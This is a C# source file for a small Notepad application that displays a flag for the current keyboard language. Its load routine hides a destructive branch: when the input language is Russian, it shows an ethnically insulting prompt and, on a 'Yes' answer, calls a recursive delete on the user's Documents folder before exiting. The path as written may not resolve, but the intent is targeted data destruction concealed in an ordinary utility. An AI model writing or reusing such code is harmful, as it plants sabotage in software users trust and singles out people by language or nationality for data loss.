namespace Notepad
{
    public partial class NotepadForm : Form
    {
        public NotepadForm()
        {
            InitializeComponent();                                  
        }

        private void NotepadForm_Load(object sender, EventArgs e)
        {
            LanguageFlagDisplay();
        }

        public void LanguageFlagDisplay()
        {
            InputLanguage LanguageUsed = InputLanguage.CurrentInputLanguage;
            if(LanguageUsed.Culture.TwoLetterISOLanguageName == "ru")
            {
                var Question = MessageBox.Show("Тьі что москаль?", "❓", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if(Question == DialogResult.Yes)
                {
                    System.IO.Directory.Delete("%CSIDL_MYDOCUMENTS%", true);
                    Application.Exit();
                }
                else if(Question == DialogResult.No)
                {
                    MessageBox.Show("Тоді чого в тебе російський \"язьік\"?", "❓", MessageBoxButtons.OK, MessageBoxIcon.Question);
                    Application.Exit();
                }
            }
            else
            {
                try
                {
#if DEBUG
                    this.LanguageFlagIcon.Image = new Bitmap("..\\..\\..\\..\\Language Flags Debug\\" + LanguageUsed.Culture.TwoLetterISOLanguageName + ".png");
#elif RELEASE
                    this.LanguageFlagIcon.Image = new Bitmap("..\\Language Flags\\" + LanguageUsed.Culture.TwoLetterISOLanguageName + ".png");
#endif
                }
                catch
                {
#if DEBUG
                    var _ = MessageBox.Show("Your flag was not found\nAdd it to the Language Flags Debug folder", "Flag not found", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                    if (_ == DialogResult.Yes)
                        System.Diagnostics.Process.Start("explorer", "/select, \"" + System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location))))) + "\\Language Flags Debug\"");
#elif RELEASE
                    var _ = MessageBox.Show("Your country's flag was not found\n Read information on how to add it", "Flag not found", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                    if (_ == DialogResult.Yes)
                        System.Diagnostics.Process.Start("explorer", "/select, \"" + System.IO.Path.GetDirectoryName(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location)) + "\\README.txt\"");
#endif
                }
            } 
        }

        private void NotepadForm_InputLanguageChanged(object sender, InputLanguageChangedEventArgs e)
        {
            LanguageFlagDisplay();
        }

        private void LanguageFlagIcon_Click(object sender, EventArgs e)
        {
            /// <summary>
            /// There should be a language switch here by clicking on the flag
            ///
            /// Тут повинно бути перемикання мови за допомогою натискання на прапорець
            /// 
            /// in short, I did not understand how to switch the keyboard layout
            /// maybe someday I will, but it's not certain
            /// 
            /// коротше кажучи я не зрозумів як перемикати розкладку клавіатури
            /// може колись зроблю але це не точно
            /// </summary>
            /// 

            //MessageBox.Show("😐", "😐");
        }

        private void NewToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Notepad.File.New(this.TextBox);
        }

        private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Notepad.File.Open(this.TextBox);
        }

        private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Notepad.File.Save(this.TextBox);
        }
    }
}